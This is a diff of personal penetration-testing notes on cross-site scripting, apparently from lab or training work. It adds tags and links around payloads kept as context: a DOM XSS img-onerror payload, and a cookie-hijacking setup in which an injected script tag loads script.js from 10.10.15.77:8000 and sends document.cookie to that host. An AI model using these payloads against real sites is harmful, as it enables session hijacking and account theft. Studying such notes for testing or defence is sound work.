@@ -1,3 +1,4 @@
+#xss
 automation:
 https://github.com/mandatoryprogrammer/xsshunter-express
 
@@ -9,7 +10,8 @@ give it a try for stored xss:
 typical payload:
 blink: ip, cookie, url
 
-DOM XSS payload:
+**DOM XSS payload**:
+[[DOM-based XSS]]
 ```html
 <img src="" onerror=alert(window.origin)>
 ```
@@ -47,7 +49,7 @@ Common places:
 - HTTP User-Agent header
 
 #### Example of hijacking cookies:
-
+[[Session hijacking]]
 Run server:
 ```php
 php -S 0.0.0.0:8000
@@ -72,6 +74,6 @@ script.js
 new Image().src='http://10.10.15.77:8000/index.php?c='+document.cookie;
 ```
 payload:
-```
+```html
 "><script src=http://10.10.15.77:8000/script.js></script>
 ```
